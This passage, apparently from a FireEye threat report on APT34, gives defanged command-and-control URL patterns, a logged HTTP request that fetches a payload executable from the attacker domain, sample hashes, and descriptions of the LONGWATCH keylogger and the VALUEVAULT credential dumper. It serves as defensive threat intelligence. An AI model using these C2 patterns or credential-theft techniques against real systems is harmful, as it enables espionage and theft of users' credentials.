@@ -1,0 +1,14 @@
+
+This value is used in subsequent requests, likely to track infected target activity.
+URLs were observed with the following structures: hxxp[://]offlineearthquake[.]com/download?id=<sys_id>&n=000 hxxp[://]offlineearthquake[.]com/upload?id=<sys_id>&n=000 hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&h=000 hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&n=000
+The first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5: 021a0f57fe09116a43c27e5133a57a0a) , identified by FireEye as LONGWATCH.
+LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder.
+Further information regarding LONGWATCH is detailed in the Malware Appendix section at the end of the post.
+FireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4).
+GET
+hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) AppleWebKit/537.36 (KHTML, like Gecko)
+Host: offlineearthquake[.]com Proxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1 Figure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network Security appliance FireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.
+VALUEVAULT is a Golang compiled version of the \"Windows Vault Password Dumper\" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.
+VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault.
+Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites.
